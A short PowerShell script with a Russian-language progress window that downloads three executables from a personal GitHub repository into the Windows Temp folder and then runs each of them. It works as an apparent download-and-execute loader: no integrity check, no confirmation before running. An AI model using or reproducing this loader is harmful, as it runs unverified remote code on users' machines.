Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.Windows.Forms

$downloads = @(
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe'; Path = 'C:\Windows\Temp\timeless_scanner.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
)

$form = New-Object System.Windows.Forms.Form
$form.Text = "Загрузка файлов"
$form.Size = New-Object System.Drawing.Size(400, 150)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(20, 20)
$label.Size = New-Object System.Drawing.Size(360, 20)
$label.Text = "Подготовка..."
$form.Controls.Add($label)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20, 50)
$progressBar.Size = New-Object System.Drawing.Size(360, 25)
$progressBar.Minimum = 0
$progressBar.Maximum = 100
$form.Controls.Add($progressBar)

$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Location = New-Object System.Drawing.Point(180, 80)
$percentLabel.Size = New-Object System.Drawing.Size(50, 20)
$percentLabel.Text = "0%"
$form.Controls.Add($percentLabel)

$form.Show()
$form.Refresh()

foreach ($item in $downloads) {
    $name = Split-Path $item.Path -Leaf
    $label.Text = "Скачиваю: $name"
    $progressBar.Value = 0
    $percentLabel.Text = "0%"
    $form.Refresh()

    $webClient = New-Object System.Net.WebClient
    $currentPath = $item.Path

    $webClient.add_DownloadProgressChanged({
        $pct = $_.ProgressPercentage
        $progressBar.Value = $pct
        $percentLabel.Text = "$pct%"
        $form.Refresh()
    }.GetNewClosure())

    $task = $webClient.DownloadFileTaskAsync($item.URL, $item.Path)

    while (-not $task.IsCompleted) {
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 50
    }

    $label.Text = "Скачано: $name"
    $form.Refresh()
}

$label.Text = "Все файлы скачаны!"
$progressBar.Value = 100
$percentLabel.Text = "100%"
$form.Refresh()
Start-Sleep -Seconds 1

$form.Close()

foreach ($item in $downloads) {
    Start-Process $item.Path
}
